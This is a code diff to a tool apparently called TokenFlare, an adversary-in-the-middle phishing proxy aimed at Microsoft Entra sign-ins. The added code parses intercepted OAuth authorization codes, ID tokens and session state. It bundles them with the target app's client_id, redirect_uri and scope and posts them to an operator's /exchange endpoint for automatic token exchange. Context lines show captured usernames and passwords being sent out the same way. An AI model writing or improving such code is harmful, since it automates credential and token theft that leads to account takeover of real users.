@@ -90,7 +90,11 @@ export default {
                 log.info("Auth code found.");
                 let authcodeUri = locationHeader;
 		log.info(authcodeUri);
-                await notifyAuthCode(cfg.webhookUrl, authcodeUri, log).catch(console.error);
+                // Send structured payload for automatic exchange + human-readable notification
+                const authParams = parseAuthCodeUrl(authcodeUri);
+                const upstreamParams = parseUpstreamParams(cfg.upstreamPath);
+                await notifyAuthCodeStructured(cfg.webhookUrl, authParams, upstreamParams, authcodeUri, log)
+                  .catch(console.error);
             }
             // then send the user to final redir
             outHeaders.set("Location", cfg.finalRedirUrl);
@@ -395,6 +399,92 @@ async function parseCredentialsFromBody(request) {
 
 async function notifyAuthCode(webhook, url, log) {
   await notify(webhook, `[TokenFlare] Auth Code Obtained!\n\nCode URL: ${url}`, log);
+}
+
+/**
+ * Send structured auth code payload for automatic token exchange.
+ * Fires BOTH the human-readable notification AND a structured JSON to /exchange.
+ */
+async function notifyAuthCodeStructured(webhook, authParams, upstreamParams, rawUrl, log) {
+  if (!webhook) {
+    log.warn('No webhook configured');
+    return;
+  }
+
+  // 1. Human-readable notification via existing pipeline
+  await notify(webhook, `[TokenFlare] Auth Code Obtained!\n\nCode URL: ${rawUrl}`, log);
+
+  // 2. Structured JSON to /exchange endpoint for automatic token exchange
+  const exchangeUrl = webhook.replace(/\/webhook\/?$/, '/exchange');
+  const payload = {
+    event: 'auth_code',
+    timestamp: new Date().toISOString(),
+    code: authParams.code,
+    client_id: upstreamParams.client_id,
+    redirect_uri: upstreamParams.redirect_uri,
+    scope: upstreamParams.scope,
+    response_type: upstreamParams.response_type,
+    state: authParams.state,
+    session_state: authParams.session_state,
+    id_token: authParams.id_token,
+    raw_url: rawUrl,
+  };
+
+  try {
+    const response = await fetch(exchangeUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+    if (!response.ok) {
+      log.error(`Exchange endpoint failed: ${response.status}`);
+    } else {
+      log.info('Structured auth code sent to exchange endpoint');
+    }
+  } catch (error) {
+    // Exchange endpoint may not be running — fall back silently
+    log.warn(`Exchange endpoint not available: ${error.message}`);
+  }
+}
+
+/**
+ * Parse the Entra redirect URL into structured components.
+ */
+function parseAuthCodeUrl(redirectUrl) {
+  try {
+    let searchStr = redirectUrl;
+    if (redirectUrl.includes('?')) {
+      searchStr = redirectUrl.split('?').slice(1).join('?');
+    } else if (redirectUrl.includes('#')) {
+      searchStr = redirectUrl.split('#').slice(1).join('#');
+    }
+    const params = new URLSearchParams(searchStr);
+    return {
+      code: params.get('code'),
+      state: params.get('state'),
+      session_state: params.get('session_state'),
+      id_token: params.get('id_token'),
+    };
+  } catch (e) {
+    return { code: null };
+  }
+}
+
+/**
+ * Extract client_id, redirect_uri, and scope from the UPSTREAM_PATH config.
+ */
+function parseUpstreamParams(upstreamPath) {
+  try {
+    const params = new URLSearchParams(upstreamPath.split('?').slice(1).join('?'));
+    return {
+      client_id: params.get('client_id'),
+      redirect_uri: params.get('redirect_uri'),
+      scope: params.get('scope'),
+      response_type: params.get('response_type'),
+    };
+  } catch (e) {
+    return {};
+  }
 }
 
 async function notifyCredentials(webhook, { username, password }, log) {
